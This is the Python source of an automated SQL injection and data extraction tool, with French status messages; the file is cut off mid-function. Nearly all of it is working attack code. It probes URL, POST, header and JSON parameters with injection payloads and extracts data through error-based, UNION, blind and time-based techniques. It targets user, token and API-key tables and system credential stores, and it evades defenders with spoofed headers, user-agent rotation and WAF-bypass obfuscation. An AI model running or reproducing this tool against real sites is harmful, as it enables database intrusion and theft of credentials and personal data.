"""
DB Extractor v7.0 — UHQKYRA
=============================================================
⚠️  Authorized security testing only.

Professional-grade SQL Injection detection + full data extraction.
Built like a real pentester would use it.

TECHNIQUES (in order of preference):
  1. Error-based  — EXTRACTVALUE / UPDATEXML / CAST (fast, reliable)
  2. UNION-based  — column count detection + visible column injection
  3. Boolean blind — binary search per char (thorough, slower)
  4. Time-based   — SLEEP/WAITFOR/pg_sleep (last resort, slowest)

DATABASES SUPPORTED:
  • MySQL 5.x / 8.x + MariaDB (primary — batch extraction)
  • PostgreSQL 9+ (CAST error, pg_sleep, pg_shadow dump)
  • MSSQL / SQL Server (CONVERT error, WAITFOR, sys.sql_logins dump)
  • SQLite (load_extension, sqlite_master)
  • Oracle (CTXSYS error, UTL_HTTP hint)

INJECTION VECTORS TESTED:
  • GET parameters (all)
  • POST parameters (all)
  • HTTP Headers: User-Agent, Referer, X-Forwarded-For, X-Real-IP, Cookie values
  • JSON body fields
  • Stacked queries detection (timing-based confirmation)

EXTRACTION FEATURES v7.0:
  • Fixed separator collision bug — uses ASCII FS/GS (0x1c/0x1d) never in real data
  • Non-MySQL multi-column: DB-native chr(28) concat per DB type
  • Blind/time: per-column individual extraction (no separator needed)
  • Row count check before dump — skips empty tables
  • System credential extraction: mysql.user / pg_shadow / sys.sql_logins
  • 25+ hash type identification (bcrypt, Argon2, PBKDF2-Django, LDAP, MSSQL...)
  • cleartext + hashed credential detection side by side

EVASION:
  • Per-request UA rotation + IP spoof headers
  • 8 WAF bypass SQL obfuscation variants
  • Inline comment injection (/*!50000 ...*/), CHAR() encoding
  • Configurable jitter between requests
=============================================================
"""
import re
import time
import random
import threading
import concurrent.futures
import urllib.parse
import warnings
warnings.filterwarnings("ignore")

try:
    import requests
    requests.packages.urllib3.disable_warnings()
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from modules.evasion import (
        random_ua, random_headers, waf_bypass_headers,
        burst_jitter, jitter, obfuscate_sql, sql_bypass_variants,
        inject_sql_comments, obfuscate_keywords,
    )
    HAS_EVASION = True
except ImportError:
    try:
        from evasion import (
            random_ua, random_headers, waf_bypass_headers,
            burst_jitter, jitter, obfuscate_sql, sql_bypass_variants,
            inject_sql_comments, obfuscate_keywords,
        )
        HAS_EVASION = True
    except ImportError:
        HAS_EVASION = False
        def random_ua(): return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        def random_headers(**kw): return {"User-Agent": random_ua()}
        def burst_jitter(): pass
        def jitter(*a, **kw): pass
        def obfuscate_sql(s, level=2): return s
        def sql_bypass_variants(p): return [("plain", p)]
        def inject_sql_comments(s, intensity=0): return s
        def obfuscate_keywords(s): return s

# ─── Constants ────────────────────────────────────────────────────────────────
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Extraction markers — short, hex-safe, unlikely in normal content
MARK_S = "S9S"
MARK_E = "E9E"
HEX_MS = "0x533953"
HEX_ME = "0x453945"

# ── Dump separators ── use ASCII control chars that NEVER appear in real data ──
# \x1c = ASCII 28 (File Separator)  — column delimiter inside a row
# \x1d = ASCII 29 (Group Separator) — row delimiter between rows
# These are below printable ASCII (32–126) so they can't appear in passwords/emails/etc.
COL_SEP_HEX  = "0x1c"    # MySQL hex literal → chr(28) byte
ROW_SEP_HEX  = "0x1d"    # MySQL hex literal → chr(29) byte
COL_SEP_CHAR = "\x1c"    # Python string for splitting
ROW_SEP_CHAR = "\x1d"    # Python string for splitting

# SQL error patterns (multi-DB)
SQL_ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning.*?mysql",
    r"mysql_fetch", r"mysql_num_rows",
    r"supplied argument is not a valid mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"pg_query\(\)", r"pg_exec\(\)",
    r"ora-\d{4,5}",
    r"microsoft.*?odbc.*?sql",
    r"incorrect syntax near",
    r"mssql_query",
    r"sqlite.*?error", r"operationalerror.*?sqlite",
    r"division by zero",
    r"column count doesn.*?match",
    r"the used select statements have a different number of columns",
    r"unknown column", r"table.*?doesn.*?exist",
    r"invalid column name",
    r"conversion failed when converting",
    r"syntax error at or near",
    r"invalid input syntax for",
    r"unterminated string",
    r"no column name was specified",
    r"cannot insert.*?null",
    r"arithmetic overflow",
]

# EXTRACTVALUE / UPDATEXML error extractor
EXTRACT_RE = re.compile(
    r'~([^~]{1,250})~|XPATH syntax error: \'~?([^\']{1,250})~?\'|'
    r'XPATH syntax error:([^<\n]{1,250})',
    re.IGNORECASE
)

# PostgreSQL CAST error extractor
PG_CAST_RE = re.compile(
    r'invalid input syntax for.*?(?:integer|numeric|bigint)[^"]*["\']([^"\']{1,250})["\']',
    re.IGNORECASE
)

# MSSQL CONVERT error extractor
MSSQL_CONV_RE = re.compile(
    r'Conversion failed when converting.*?value \'([^\']{1,250})\'',
    re.IGNORECASE
)

# DB type detection
DB_SIGNATURES = {
    "MySQL": [
        r"you have an error in your sql syntax",
        r"warning.*?mysql", r"mysql_fetch",
        r"mysql_num_rows", r"mariadb",
    ],
    "PostgreSQL": [
        r"pg_query\(\)", r"pg_exec\(\)",
        r"postgresql.*?error", r"org\.postgresql",
        r"syntax error at or near", r"invalid input syntax for",
    ],
    "MSSQL": [
        r"microsoft.*?odbc.*?sql", r"incorrect syntax near",
        r"mssql_query", r"unclosed quotation mark",
        r"conversion failed", r"arithmetic overflow",
    ],
    "SQLite": [
        r"sqlite.*?error", r"operationalerror.*?sqlite",
        r"no such table", r"no such column",
    ],
    "Oracle": [
        r"ora-\d{4,5}", r"oracle error",
        r"oracle.*?driver", r"quoted string not properly terminated",
    ],
}

# Sensitive tables to prioritize for dumping
SENSITIVE_TABLES = [
    "users", "user", "admin", "admins", "accounts", "account",
    "members", "member", "customers", "customer", "login",
    "credentials", "auth", "authentication", "passwords", "password",
    "employees", "staff", "orders", "payments", "transactions",
    "emails", "messages", "tokens", "sessions", "config", "settings",
    "secrets", "keys", "api_keys", "access_tokens", "refresh_tokens",
    "wp_users", "joomla_users", "jos_users", "drupal_users",
    "phpbb_users", "vb_user", "smf_members", "oc_users",
    "tbladmin", "tbluser", "tbl_users", "tb_users",
    "system_user", "root", "superuser",
]

# Sensitive column keywords (for prioritizing in dumps)
SENSITIVE_COLS = [
    "password", "passwd", "pass", "pwd", "hash", "secret",
    "token", "key", "api_key", "auth", "salt", "2fa",
    "email", "username", "user", "login", "admin",
    "credit_card", "ssn", "dob", "phone", "address",
]

# HTTP headers that may be injectable
INJECTABLE_HEADERS = [
    "User-Agent",
    "X-Forwarded-For",
    "Referer",
    "X-Real-IP",
    "X-Custom-Header",
    "CF-Connecting-IP",
    "True-Client-IP",
    "X-Originating-IP",
    "Client-IP",
]


# ─── Hash identification ──────────────────────────────────────────────────────

def _identify_hash(val):
    """Identify common password hash types — supports 25+ formats"""
    if not val:
        return None
    val = val.strip()
    # ── Modular crypt format ──────────────────────────────────────────────────
    if re.match(r'^\$2[aby]\$\d{2}\$', val):
        return "bcrypt"
    if re.match(r'^\$argon2(id?|i)\$', val):
        return "Argon2"
    if re.match(r'^\$P\$', val):
        return "WordPress phpass"
    if re.match(r'^\$H\$', val):
        return "phpBB3 phpass"
    if re.match(r'^\$S\$', val):
        return "Drupal SHA-512"
    if re.match(r'^\$1\$', val):
        return "MD5-crypt"
    if re.match(r'^\$6\$', val):
        return "SHA-512-crypt"
    if re.match(r'^\$5\$', val):
        return "SHA-256-crypt"
    if re.match(r'^\$apr1\$', val):
        return "Apache MD5"
    if re.match(r'^\$y\$', val):
        return "yescrypt"
    # ── Django / PBKDF2 ───────────────────────────────────────────────────────
    if re.match(r'^pbkdf2_sha(256|512)\$', val, re.I):
        return "PBKDF2 (Django)"
    if re.match(r'^sha1\$', val):
        return "SHA-1 (Django)"
    if re.match(r'^md5\$', val):
        return "MD5 (Django)"
    if re.match(r'^bcrypt\$\$2[aby]', val):
        return "bcrypt (Django)"
    # ── LDAP ─────────────────────────────────────────────────────────────────
    if re.match(r'^\{SSHA\}', val, re.I):
        return "SSHA (LDAP)"
    if re.match(r'^\{SHA\}', val, re.I):
        return "SHA-1 (LDAP)"
    if re.match(r'^\{MD5\}', val, re.I):
        return "MD5 (LDAP)"
    if re.match(r'^\{CRYPT\}', val, re.I):
        return "crypt (LDAP)"
    # ── MySQL ─────────────────────────────────────────────────────────────────
    if re.match(r'^\*[0-9A-F]{40}$', val):
        return "MySQL SHA1"
    if re.match(r'^[0-9a-f]{16}$', val, re.I):
        return "MySQL OLD (DES)"
    # ── Raw hex hashes ────────────────────────────────────────────────────────
    if re.match(r'^[0-9a-f]{128}$', val, re.I):
        return "SHA-512"
    if re.match(r'^[0-9a-f]{96}$', val, re.I):
        return "SHA-384"
    if re.match(r'^[0-9a-f]{64}$', val, re.I):
        return "SHA-256"
    if re.match(r'^[0-9a-f]{56}$', val, re.I):
        return "SHA-224"
    if re.match(r'^[0-9a-f]{40}$', val, re.I):
        return "SHA-1"
    if re.match(r'^[0-9a-f]{32}$', val, re.I):
        return "MD5"
    # ── Base64-encoded ────────────────────────────────────────────────────────
    if re.match(r'^[A-Za-z0-9+/]{86}={0,2}$', val):
        return "SHA-512 (base64)"
    if re.match(r'^[A-Za-z0-9+/]{60}={0,2}$', val):
        return "SHA-384 (base64)"
    if re.match(r'^[A-Za-z0-9+/]{43}=$', val):
        return "SHA-256 (base64)"
    if re.match(r'^[A-Za-z0-9+/]{27}=$', val):
        return "MD5 (base64)"
    # ── MSSQL ─────────────────────────────────────────────────────────────────
    if re.match(r'^0x0200[0-9A-F]+$', val, re.I) and len(val) == 54:
        return "MSSQL 2012+ (SHA-512)"
    if re.match(r'^0x0100[0-9A-F]+$', val, re.I) and len(val) == 54:
        return "MSSQL 2000 (SHA-1)"
    return None


# ─── Helpers ─────────────────────────────────────────────────────────────────

def _has_sql_error(text):
    t = (text or "").lower()
    return any(re.search(p, t) for p in SQL_ERROR_PATTERNS)


def _detect_db_from_error(text):
    t = (text or "").lower()
    for db, patterns in DB_SIGNATURES.items():
        if any(re.search(p, t) for p in patterns):
            return db
    return "MySQL"


def _extract_error_value(text):
    """Extract data from EXTRACTVALUE/UPDATEXML error"""
    if not text:
        return None
    m = EXTRACT_RE.search(text)
    if m:
        val = (m.group(1) or m.group(2) or m.group(3) or "").strip("~").strip()
        if val and val not in ("1", ""):
            return val
    return None


def _extract_pg_cast(text):
    """Extract data from PostgreSQL CAST type error"""
    if not text:
        return None
    m = PG_CAST_RE.search(text)
    if m:
        return m.group(1).strip()
    return None


def _extract_mssql_convert(text):
    """Extract data from MSSQL CONVERT error"""
    if not text:
        return None
    m = MSSQL_CONV_RE.search(text)
    if m:
        return m.group(1).strip()
    return None


def _responses_differ(r1, r2, threshold=0.06):
    """True if responses are significantly different in length"""
    if r1 is None or r2 is None:
        return True
    l1, l2 = len(r1), len(r2)
    if l1 == 0 and l2 == 0:
        return False
    diff = abs(l1 - l2) / max(l1, l2, 1)
    # Also check for keyword presence changes
    for kw in ["error", "warning", "not found", "access denied", "invalid"]:
        if (kw in r1.lower()) != (kw in r2.lower()):
            return True
    return diff > threshold


def _content_differs(r1, r2, threshold=0.04):
    """Stricter content comparison including text similarity"""
    if _responses_differ(r1, r2, threshold):
        return True
    # Additional check: significant word set difference
    try:
        w1 = set(r1.lower().split())
        w2 = set(r2.lower().split())
        if not w1 or not w2:
            return False
        jaccard = len(w1 & w2) / len(w1 | w2)
        return jaccard < 0.85
    except Exception:
        return False


# ─── Core Injector Class ──────────────────────────────────────────────────────

class SQLInjector:
    """
    Professional SQL Injection detection + extraction engine v7.0.

    Usage:
        inj = SQLInjector("http://target.com/page.php?id=1", callback=cb)
        if inj.find_injection():
            inj.setup_technique()
            info = inj.extract_info()
            tables = inj.extract_tables()
            creds = inj.extract_credentials()
    """

    # (name, true_template, false_template)
    # {V}=original value, {S}=suffix
    CONTEXTS = [
        # Numeric
        ("numeric",    "{V} AND 1=1{S}",           "{V} AND 1=2{S}"),
        ("numeric_or", "{V} OR 1=1{S}",            "{V} OR 1=2{S}"),
        ("num_paren1", "{V}) AND (1=1{S}",          "{V}) AND (1=2{S}"),
        ("num_paren2", "{V}) AND 1=1{S}",           "{V}) AND 1=2{S}"),
        ("num_paren3", "{V})) AND ((1=1{S}",        "{V})) AND ((1=2{S}"),
        # Single-quote string
        ("string1",    "{V}' AND '1'='1{S}",        "{V}' AND '1'='2{S}"),
        ("string2",    "{V}' AND 1=1{S}",            "{V}' AND 1=2{S}"),
        ("str_or",     "{V}' OR '1'='1{S}",          "{V}' OR '1'='2{S}"),
        ("str_paren1", "{V}') AND ('1'='1{S}",       "{V}') AND ('1'='2{S}"),
        ("str_paren2", "{V}') AND (1=1{S}",          "{V}') AND (1=2{S}"),
        ("str_paren3", "{V}')) AND (('1'='1{S}",     "{V}')) AND (('1'='2{S}"),
        # Double-quote string
        ("dquote",     '{V}" AND "1"="1{S}',         '{V}" AND "1"="2{S}'),
        ("dq_paren",   '{V}") AND ("1"="1{S}',       '{V}") AND ("1"="2{S}'),
        # Arithmetic (good for WAF bypass)
        ("arith_add",  "{V}+0{S}",                   "{V}+1e9{S}"),
        ("arith_sub",  "{V}-0{S}",                   "{V}-1e9{S}"),
        # Comment-based (MySQL /*!*/ trick)
        ("cmt_num",    "{V}/*!AND*/1=1{S}",           "{V}/*!AND*/1=2{S}"),
    ]

    SUFFIXES = [
        "-- -", "#", "--", "-- ", " -- ", "/*", "%00",
        "; --", "%23", "-- comment", "\n--", "\r\n--",
    ]

    def __init__(self, url, param=None, method="GET", post_data=None,
                 cookies=None, headers=None, callback=None, timeout=12,
                 test_headers=False):
        self.url           = url
        self.param         = param
        self.method        = method.upper()
        self.post_data     = dict(post_data or {})
        self.cookies       = dict(cookies or {})
        self.extra_hdr     = dict(headers or {})
        self.cb_fn         = callback
        self.timeout       = timeout
        self.test_headers  = test_headers  # also test HTTP headers as vectors

        self.session = requests.Session() if HAS_REQUESTS else None

        # Discovered injection state
        self.inj_param   = None
        self.inj_ctx     = None
        self.inj_true    = None
        self.inj_false   = None
        self.inj_suffix  = None
        self.inj_method  = "GET"
        self.inj_is_header = False   # True if injection is in a header
        self.inj_header  = None      # Which header

        # Extraction state
        self.technique   = None
        self.db_type     = "MySQL"
        self.num_cols    = 0
        self.vis_col     = -1
        self._err_fn     = "EXTRACTVALUE"

        # Baselines
        self._baseline   = None
        self._orig_val   = None

        # Parse URL
        self._parsed = urllib.parse.urlparse(url if "://" in url else "http://" + url)
        self._qs     = dict(urllib.parse.parse_qsl(self._parsed.query, keep_blank_values=True))

    # ── Callback ─────────────────────────────────────────────────────────────
    def _cb(self, t, m):
        if self.cb_fn:
            self.cb_fn({"type": t, "message": m})

    # ── Request ──────────────────────────────────────────────────────────────
    def _req(self, payload, param=None, method=None, extra_qs=None, hdr_inject=None):
        """Send request with payload + stealth headers + jitter"""
        if not self.session:
            return ""
        p = param or self.inj_param
        m = (method or self.inj_method or self.method).upper()
        hdrs = random_headers(include_ip_spoof=True, include_referrer=True)
        hdrs.update(self.extra_hdr)
        if hdr_inject:
            hdrs.update(hdr_inject)
        burst_jitter()
        try:
            if m == "GET":
                qs = dict(self._qs)
                if extra_qs:
                    qs.update(extra_qs)
                if p and not hdr_inject:
                    qs[p] = payload
                base = self._parsed._replace(query="").geturl()
                r = self.session.get(base, params=qs, timeout=self.timeout,
                                     verify=False, headers=hdrs,
                                     cookies=self.cookies, allow_redirects=True)
            else:
                data = dict(self.post_data)
                if p and not hdr_inject:
                    data[p] = payload
                r = self.session.post(self.url, data=data, timeout=self.timeout,
                                      verify=False, headers=hdrs,
                                      cookies=self.cookies, allow_redirects=True)
            return r.text
        except Exception:
            return ""

    def _req_hdr(self, header_name, payload):
        """Inject payload into a specific HTTP header"""
        if not self.session:
            return ""
        hdrs = random_headers(include_ip_spoof=True, include_referrer=False)
        hdrs.update(self.extra_hdr)
        hdrs[header_name] = payload
        burst_jitter()
        try:
            base = self._parsed._replace(query="").geturl()
            qs = dict(self._qs)
            r = self.session.get(base, params=qs, timeout=self.timeout,
                                 verify=False, headers=hdrs,
                                 cookies=self.cookies, allow_redirects=True)
            return r.text
        except Exception:
            return ""

    def _req_payload(self, payload):
        """Send with prebuilt payload"""
        if self.inj_is_header:
            return self._req_hdr(self.inj_header, payload)
        return self._req(payload, param=self.inj_param, method=self.inj_method)

    # ── Payload building ─────────────────────────────────────────────────────
    def _build(self, template, orig_val, suffix):
        return template.replace("{V}", str(orig_val)).replace("{S}", suffix)

    def _ov(self):
        if self._orig_val is not None:
            return self._orig_val
        return (self._qs.get(self.inj_param)
                or self.post_data.get(self.inj_param, "")
                or "1")

    def _quote(self):
        ctx = self.inj_ctx or "string1"
        if "num" in ctx or "arith" in ctx or "cmt" in ctx:
            return ""
        if "dquote" in ctx or "dq_" in ctx:
            return '"'
        if "paren" in ctx and "str" in ctx:
            return "')"
        if "paren" in ctx and "dq_" in ctx:
            return '")'
        return "'"

    def _wrap(self, injection):
        """Wrap injection in discovered context"""
        ov  = self._ov()
        q   = self._quote()
        suf = self.inj_suffix or "-- -"
        return f"{ov}{q} {injection}{suf}"

    def _wrap_neg(self, injection):
        """Use -1 to suppress original row (for UNION)"""
        q   = self._quote()
        suf = self.inj_suffix or "-- -"
        return f"-1{q} {injection}{suf}"

    # ── Injection finding ────────────────────────────────────────────────────
    def find_injection(self):
        """
        Test all URL + POST parameters (and optionally HTTP headers) for SQLi.
        Returns True if injection found.
        """
        if not self.session:
            return False

        # Build param list
        params_to_test = []
        if self.param:
            val = self._qs.get(self.param) or self.post_data.get(self.param) or "1"
            params_to_test.append(("GET", self.param, val))
        else:
            for k, v in self._qs.items():
                params_to_test.append(("GET", k, v))
            for k, v in self.post_data.items():
                params_to_test.append(("POST", k, v))

        if not params_to_test:
            self._cb("warn", "🗄️ Aucun paramètre URL — test avec id=1")
            params_to_test.append(("GET", "id", "1"))

        # Track what we test (for _scan_meta in full_db_extraction)
        self._tested_params  = [p for (_, p, _) in params_to_test]
        self._tested_headers = []

        self._cb("info", f"🗄️ Test {len(params_to_test)} paramètre(s) pour SQLi...")

        for method, param, orig_val in params_to_test:
            if self._test_param(method, param, str(orig_val)):
                return True

        # Also test HTTP headers if requested or no params found
        if self.test_headers or not params_to_test:
            self._cb("info", "🗄️ Test injection dans les headers HTTP...")
            self._tested_headers = list(INJECTABLE_HEADERS)
            if self._test_header_injection():
                return True

        # Test JSON body
        if self.post_data:
            self._cb("info", "🗄️ Test injection JSON...")
            if self._test_json_injection():
                return True

        self._cb("warn", "🗄️ Aucune injection SQL détectée sur ce point d'entrée")
        return False

    def _test_param(self, method, param, orig_val):
        """Test a single parameter for SQLi"""
        self._cb("info", f"🗄️   [{method}] {param}={orig_val[:30]}")

        # Quick error probe
        self.inj_param  = param
        self.inj_method = method
        self.inj_is_header = False
        quote_resp = self._req(str(orig_val) + "'", param=param, method=method)
        if _has_sql_error(quote_resp):
            self.db_type = _detect_db_from_error(quote_resp)
            self._cb("found", f"🗄️ Erreur SQL via quote sur '{param}' — DB: {self.db_type}")

        baseline = self._req(str(orig_val), param=param, method=method)
        self._baseline = baseline

        for ctx_name, true_tpl, false_tpl in self.CONTEXTS:
            for suffix in self.SUFFIXES:
                true_pay  = self._build(true_tpl,  orig_val, suffix)
                false_pay = self._build(false_tpl, orig_val, suffix)
                true_r    = self._req(true_pay,  param=param, method=method)
                false_r   = self._req(false_pay, param=param, method=method)
                if not true_r or not false_r:
                    continue

                true_like  = not _responses_differ(baseline, true_r,  threshold=0.05)
                false_diff = _responses_differ(baseline, false_r, threshold=0.05)
                tf_diff    = _responses_differ(true_r,   false_r, threshold=0.04)

                if (true_like and false_diff) or tf_diff:
                    self._cb("found",
                             f"🗄️ ✅ SQLi! param='{param}' ctx={ctx_name} suf='{suffix}'")
                    self.inj_param  = param
                    self.inj_method = method
                    self.inj_ctx    = ctx_name
                    self.inj_true   = true_tpl
                    self.inj_false  = false_tpl
                    self.inj_suffix = suffix
                    self._baseline  = baseline
                    self._orig_val  = str(orig_val)
                    return True
        return False

    def _test_header_injection(self):
        """Test HTTP headers as injection vectors"""
        orig_val = "Mozilla/5.0"
        for header in INJECTABLE_HEADERS:
            baseline = self._req_hdr(header, orig_val)
            if not baseline:
                continue
            # Quick error probe
            quote_resp = self._req_hdr(header, orig_val + "'")
            if _has_sql_error(quote_resp):
                self.db_type = _detect_db_from_error(quote_resp)
                self._cb("found", f"🗄️ Erreur SQL dans header '{header}'!")

            # Boolean test
            for suffix in ["-- -", "#", "--"]:
                true_pay  = f"{orig_val}' AND '1'='1{suffix}"
                false_pay = f"{orig_val}' AND '1'='2{suffix}"
                true_r  = self._req_hdr(header, true_pay)
                false_r = self._req_hdr(header, false_pay)
                if not true_r or not false_r:
                    continue
                if _responses_differ(true_r, false_r, 0.04):
                    self._cb("found", f"🗄️ ✅ SQLi dans header '{header}'!")
                    self.inj_is_header = True
                    self.inj_header    = header
                    self.inj_ctx       = "string1"
                    self.inj_true      = "{V}' AND '1'='1{S}"
                    self.inj_false     = "{V}' AND '1'='2{S}"
                    self.inj_suffix    = suffix
                    self._orig_val     = orig_val
                    self._baseline     = baseline
                    return True
        return False

    def _test_json_injection(self):
        """Test JSON body fields for SQLi"""
        if not self.session:
            return False
        for field, orig in self.post_data.items():
            try:
                hdrs = random_headers()
                hdrs["Content-Type"] = "application/json"
                import json as _json
                # Boolean test
                for suffix in ["-- -", "#"]:
                    p_true  = {field: str(orig) + f"' AND '1'='1{suffix}"}
                    p_false = {field: str(orig) + f"' AND '1'='2{suffix}"}
                    r_true  = self.session.post(
                        self.url, data=_json.dumps(p_true), headers=hdrs,
                        timeout=self.timeout, verify=False, cookies=self.cookies)
                    r_false = self.session.post(
                        self.url, data=_json.dumps(p_false), headers=hdrs,
                        timeout=self.timeout, verify=False, cookies=self.cookies)
                    if r_true and r_false and _responses_differ(r_true.text, r_false.text, 0.04):
                        self._cb("found", f"🗄️ ✅ SQLi JSON dans field '{field}'!")
                        self.inj_param  = field
                        self.inj_method = "POST"
                        self.inj_ctx    = "string1"
                        self.inj_true   = "{V}' AND '1'='1{S}"
                        self.inj_false  = "{V}' AND '1'='2{S}"
                        self.inj_suffix = suffix
                        self._orig_val  = str(orig)
                        return True
            except Exception:
                continue
        return False

    # ── Stacked queries detection ─────────────────────────────────────────────
    def detect_stacked_queries(self):
        """Detect stacked queries via timing (non-destructive: sleep only)"""
        self._cb("info", "🗄️ Test stacked queries (timing)...")
        for sleep_payload in [
            f"{self._ov()}'; SELECT SLEEP(2)-- -",
            f"{self._ov()}'; WAITFOR DELAY '0:0:2'-- -",
            f"{self._ov()}'; SELECT pg_sleep(2)-- -",
        ]:
            t0 = time.time()
            self._req_payload(sleep_payload)
            elapsed = time.time() - t0
            if elapsed >= 1.8:
                self._cb("found", f"🗄️ ✅ Stacked queries! ({elapsed:.1f}s) — batch execution possible")
                return True
        return False

    # ── Column detection ─────────────────────────────────────────────────────
    def _detect_cols_orderby(self):
        """ORDER BY N — binary search for column count"""
        ref = self._req_payload(self._wrap("ORDER BY 1"))
        if not ref:
            ref = self._baseline or ""
        for n in range(2, 26):
            resp = self._req_payload(self._wrap(f"ORDER BY {n}"))
            if not resp:
                continue
            if _has_sql_error(resp) or _responses_differ(ref, resp, threshold=0.04):
                cols = n - 1
                self._cb("found", f"🗄️ ORDER BY: {cols} colonne(s)")
                return cols
        return 0

    def _detect_cols_union(self):
        """UNION SELECT NULL×N — find column count"""
        for n in range(1, 26):
            for kw in ["UNION ALL SELECT", "UNION SELECT"]:
                nulls = ",".join(["NULL"] * n)
                resp = self._req_payload(self._wrap(f"{kw} {nulls}"))
                if resp and not _has_sql_error(resp):
                    self._cb("found", f"🗄️ {kw} NULL×{n}: OK")
                    return n
        return 0

    def detect_columns(self):
        n = self._detect_cols_orderby()
        if not n:
            n = self._detect_cols_union()
        self.num_cols = n
        if n:
            self._cb("found", f"🗄️ Colonnes: {n}")
        return n

    # ── Visible column ────────────────────────────────────────────────────────
    def find_visible_column(self, num_cols=None):
        n = num_cols or self.num_cols or 10
        self._cb("info", f"🗄️ Recherche colonne visible ({n} cols)...")
        for pos in range(n):
            # Numeric marker (always visible, never filtered)
            cols = ["NULL"] * n
            cols[pos] = "98765432100"
            resp = self._req_payload(self._wrap_neg(f"UNION ALL SELECT {','.join(cols)}"))
            if resp and "98765432100" in resp:
                self._cb("found", f"🗄️ Colonne visible: position {pos+1}/{n}")
                self.vis_col = pos
                return pos
            # String marker
            cols[pos] = HEX_MS
            resp2 = self._req_payload(self._wrap_neg(f"UNION ALL SELECT {','.join(cols)}"))
            if resp2 and MARK_S in resp2:
                self.vis_col = pos
                return pos
        self._cb("warn", "🗄️ Colonne visible non trouvée — error-based utilisé")
        return -1

    # ── Technique setup ───────────────────────────────────────────────────────
    def setup_technique(self):
        """Determine best extraction technique"""

        # ── 1. Error-based (MySQL: EXTRACTVALUE) ─────────────────────────────
        self._cb("info", "🗄️ Test EXTRACTVALUE...")
        pay = self._wrap("AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT 1),0x7e))")
        resp = self._req_payload(pay)
        if _extract_error_value(resp) == "1":
            self._cb("ok", "✅ EXTRACTVALUE prêt (MySQL)")
            self.technique = "error"
            self._err_fn   = "EXTRACTVALUE"
            return "error"

        # ── 2. Error-based (MySQL: UPDATEXML) ────────────────────────────────
        self._cb("info", "🗄️ Test UPDATEXML...")
        pay2 = self._wrap("AND UPDATEXML(1,CONCAT(0x7e,(SELECT 1),0x7e),1)")
        resp2 = self._req_payload(pay2)
        if _extract_error_value(resp2) == "1":
            self._cb("ok", "✅ UPDATEXML prêt (MySQL)")
            self.technique = "error"
            self._err_fn   = "UPDATEXML"
            return "error"

        # ── 3. Error-based WAF bypass variants ───────────────────────────────
        self._cb("info", "🗄️ Test error-based avec WAF bypass...")
        for obf in [
            "AND /*!50000EXTRACTVALUE*/(1,CONCAT(0x7e,(SELECT 1),0x7e))",
            "AND EXTRACTVALUE(0x0a,CONCAT(0x0a,0x7e,(SELECT/**/1),0x7e))",
            "AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
        ]:
            resp_obf = self._req_payload(self._wrap(obf))
            if _extract_error_value(resp_obf) or _has_sql_error(resp_obf):
                # Try full extraction to confirm
                pay_test = self._wrap(f"AND EXTRACTVALUE(1,CONCAT(0x7e,({self._sql_version()}),0x7e))")
                r_test = self._req_payload(pay_test)
                if _extract_error_value(r_test):
                    self._cb("ok", "✅ Error-based (WAF bypass) prêt")
                    self.technique = "error"
                    self._err_fn   = "EXTRACTVALUE"
                    return "error"

        # ── 4. Error-based (PostgreSQL: CAST) ────────────────────────────────
        self._cb("info", "🗄️ Test CAST error (PostgreSQL)...")
        pay_pg = self._wrap("AND CAST((SELECT version()) AS INT)=1")
        resp_pg = self._req_payload(pay_pg)
        if _extract_pg_cast(resp_pg):
            self._cb("ok", "✅ CAST error-based prêt (PostgreSQL)")
            self.technique = "pg_error"
            self.db_type   = "PostgreSQL"
            return "pg_error"

        # ── 5. Error-based (MSSQL: CONVERT) ──────────────────────────────────
        self._cb("info", "🗄️ Test CONVERT error (MSSQL)...")
        pay_ms = self._wrap("AND CONVERT(INT,(SELECT @@version))=1")
        resp_ms = self._req_payload(pay_ms)
        if _extract_mssql_convert(resp_ms):
            self._cb("ok", "✅ CONVERT error-based prêt (MSSQL)")
            self.technique = "mssql_error"
            self.db_type   = "MSSQL"
            return "mssql_error"

        # ── 6. UNION-based ────────────────────────────────────────────────────
        self._cb("info", "🗄️ Test UNION-based...")
        n = self.detect_columns()
        if n:
            pos = self.find_visible_column(n)
            if pos >= 0:
                self._cb("ok", f"✅ UNION-based prêt (col {pos+1}/{n})")
                self.technique = "union"
                return "union"

        # ── 7. Boolean blind ──────────────────────────────────────────────────
        self._cb("info", "🗄️ Test boolean blind...")
        tr = self._req_payload(self._wrap("AND 1=1"))
        fa = self._req_payload(self._wrap("AND 1=2"))
        if tr and fa and _responses_differ(tr, fa, 0.03):
            self._cb("ok", "✅ Boolean blind prêt")
            self.technique = "blind"
            return "blind"

        # ── 8. Time-based ─────────────────────────────────────────────────────
        self._cb("info", "🗄️ Test time-based (SLEEP 2s)...")
        t0 = time.time()
        self._req_payload(self._wrap("AND SLEEP(2)"))
        if time.time() - t0 >= 1.8:
            self._cb("ok", "✅ Time-based prêt (MySQL SLEEP)")
            self.technique = "time"
            return "time"

        # PostgreSQL time-based
        t0 = time.time()
        self._req_payload(self._wrap("AND 1=(SELECT 1 FROM pg_sleep(2))"))
        if time.time() - t0 >= 1.8:
            self._cb("ok", "✅ Time-based prêt (PostgreSQL pg_sleep)")
            self.technique = "time"
            self.db_type   = "PostgreSQL"
            return "time"

        # MSSQL time-based
        t0 = time.time()
        self._req_payload(self._wrap("AND 1=1; WAITFOR DELAY '0:0:2'-- -"))
        if time.time() - t0 >= 1.8:
            self._cb("ok", "✅ Time-based prêt (MSSQL WAITFOR)")
            self.technique = "time"
            self.db_type   = "MSSQL"
            return "time"

        self._cb("warn", "🗄️ Aucune technique d'extraction disponible")
        return None

    # ── SQL version query helper ──────────────────────────────────────────────
    def _sql_version(self):
        db = self.db_type or "MySQL"
        if db == "MySQL":       return "SELECT @@version"
        if db == "PostgreSQL":  return "SELECT version()"
        if db == "MSSQL":       return "SELECT @@version"
        if db == "SQLite":      return "SELECT sqlite_version()"
        if db == "Oracle":      return "SELECT banner FROM v$version WHERE rownum=1"
        return "SELECT @@version"

    # ── Error-based extraction (MySQL) ────────────────────────────────────────
    def _error_extract(self, sql_expr):
